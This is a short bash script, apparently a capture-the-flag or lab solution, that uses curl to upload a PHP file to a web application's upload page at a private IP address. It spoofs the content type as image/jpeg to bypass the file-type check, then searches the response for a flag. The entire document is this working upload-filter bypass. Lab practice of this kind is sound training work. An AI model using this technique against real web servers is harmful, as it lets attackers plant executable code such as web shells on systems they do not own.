  
#!/usr/bin/bash

IP=192.168.1.113

curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@test2.php;type=image/jpeg' http://$IP/index.php\?page\=upload\# | grep "flag"